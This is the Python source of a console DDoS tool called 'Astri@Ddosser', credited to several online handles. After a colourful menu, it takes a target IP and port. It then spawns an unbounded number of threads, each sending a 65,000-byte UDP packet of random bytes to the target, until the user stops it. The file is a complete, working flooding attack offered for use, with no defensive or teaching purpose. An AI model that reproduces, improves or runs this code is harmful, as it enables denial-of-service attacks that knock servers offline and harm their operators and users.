from tkinter import messagebox
from pystyle import *
from colorama import Fore
import threading
import socket
import random
import ctypes
import time
import sys
import re
import os




# ASSETS
#####################################################
def cls():
      os.system('cls' if os.name=='nt' else 'clear')


def settings():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW('Astri@Ddosser | by Astri Developers')
      os.system('mode con: cols=149 lines=23')

def inbrainingsettings():
     ctypes.windll.kernel32.SetConsoleTitleW('Astri@Ddosser | press CTRL + C to stop the process')
     os.system('mode con: cols=65 lines=40')




def quitfr():
      cls()
      raise SystemExit


def creditsfr():
    messagebox.showinfo('Credits','   This program was codede by:\n    - @astros3x\n    - @CaptainBeluga    \n    - @FallenLeakz\n\n   Discord > .gg/astros3x')
    brain()


def dderrorin():
    layout()
    print(Colorate.Horizontal(Colors.red_to_white, '$ Error input', 2))
    time.sleep(1.5)
    brain()


def slowprint(s, c, newLine=True):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1. / 30)
#####################################################




# LAYOUT
#####################################################
menuascii = '''☽════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════☾
☽════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════☾  
                                                                  ASTRI@DDOSSER              
             ¬▀▄ V                                      ╔═════════════════════════════════╗                                   V ▄▀
        ¬,  ▄ ▒▀█▄▀▄                                   ░║  1. [  start the attack  ]  >   ║▒                                ▄▀▄&▀  ▄  ˎ¬            
   .^. ▀████▒███$▄▄██▒█▄                               ▒║  2. [      credits       ]  >   ║ ▒                             ▄████▄▄██████%██▀    
 ░"████#█▒▒█████~^███▒██,¬                            ▒▒║  3. [        quit        ]  >   ║▒                           ˎ██████████#██████████"▒░ 
,▄███▒█▀  ░   ~`▀████$████▄                           ░▒╚═════════════════════════════════╝▒▒                       ▄█████████▀` ▒▒▒   `▀█████▄ˎ 
 ▄█▒█▀             ▀█████¬██¬                        ░░ ▒▒ ░       ░  ░░ ░▒▒▒▒  ░ ░        ░ ▒                     ╒██╒██▒▒█▀:    ░       `▀███▄%    
▀#███                ▀███████▄                         ░                ░ ░░  ▒░            ▒ ░                    ▄███████▀     ░       ▒ :████▀  
░███@█                 ▀▀▒███▄                          ░        ░     ░     ░            ░                      ░▄████▀▀        ░      ░▒█████▒▒  
  ▒▒███▄                 ░▒████▄,                      ░                 ░                                    ˎ▄████▀░░               ░▄████▒░ 
   ▀▀▀███▄,               ░ ▀███▀                                                                             ▀███▀ ░               ˎ▄██$▀▀▀░
    ░▒ `▀█▒██▄,             ╒▀▀ ~                                         ░                                   ▒▀╒  ░            ˎ▄████▀`▒░
     ░     -▀▀█▒█▄▄~        ░                       ░                                                                          ▄▄███▀▀-  ░
    ░       ░░░░ ▀██▄_                                                                       ░                       ░      _▄██▀~░░       ░  
            ░       ▀█▄   ░                                                                                               ▄█▀▒   ░    ░
          ░          ▒▀█                                           ░                                                      █▀ ░░         
     ░░               ░▐                                                       ░                                          ▐  ░     ░    ░░

☽════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════☾
☽════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════☾\n'''


def layout():
    settings()
    print(Colorate.Horizontal(Colors.red_to_white, menuascii, 2))
#####################################################




# MAIN MENU
#####################################################
def brain():
    while True:
        layout()
        ininput = input(Colorate.Vertical(Colors.red_to_white, '$ ', 2))
        try:
            choose = int(ininput)
            break
        except (ValueError, TypeError, NameError):
            brain()
    if choose == 1:
        ddosbrain()
    if choose == 2:
        creditsfr()
    if choose == 3:
         quitfr()
#####################################################
          
        
        

            



# Ddos system
#####################################################
def ddosbrain():

    def ipbrainer(ip):
            ipfr = re.compile(r"^([0-9]{1,3}\.){3}[0-9]{1,3}$")
            if ipfr.match(ip):
                return True
            else:
                return False
            
    while True:
            layout()
            ip = input(Colorate.Horizontal(Colors.red_to_white, "$ [input@ip] > ",2))
            if ipbrainer(ip):
                break
            else:
                dderrorin()



    def portbrainer(port):
            if port.isdigit():
                portfr = int(port)
                if 0 <= portfr <= 65535:
                    return True
            return False
    
    while True:
            layout()
            port = input(Colorate.Horizontal(Colors.red_to_white, "$ [input@port] > ",2))
            if portbrainer(port):
                break
            else:
                dderrorin()

    cls()
    slowprint(f'{Fore.RED}The attack is going to start, press CTRL + C to stop the process{Fore.RESET}', 0.0035)
    inbrainingsettings()
    time.sleep(1.5)
    cls()


    buffer_size = 65_000
    delay = 100 / 1000


    threads = []



    def ddos(ip, port, packet):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(packet, (ip,int(port)))
            time.sleep(delay)
        except:
            pass
            
    n = 0

    while True:
        try:
            n+=1
            packet = random._urandom(buffer_size)

            t = threading.Thread(target=ddos,args=(ip,port,packet,))
            t.start()
            threads.append(t)

            print(Colorate.Horizontal(Colors.red_to_white, f'''| threads > {n} | {ip}:{port} | buffer size > {buffer_size} |\n''', 2))

        except KeyboardInterrupt:
            break


    for y in threads:
        y.join()


    print(Colorate.Horizontal(Colors.red_to_white, '$ Attack stopped', 2))
    time.sleep(1.5)
    brain()
#####################################################


brain()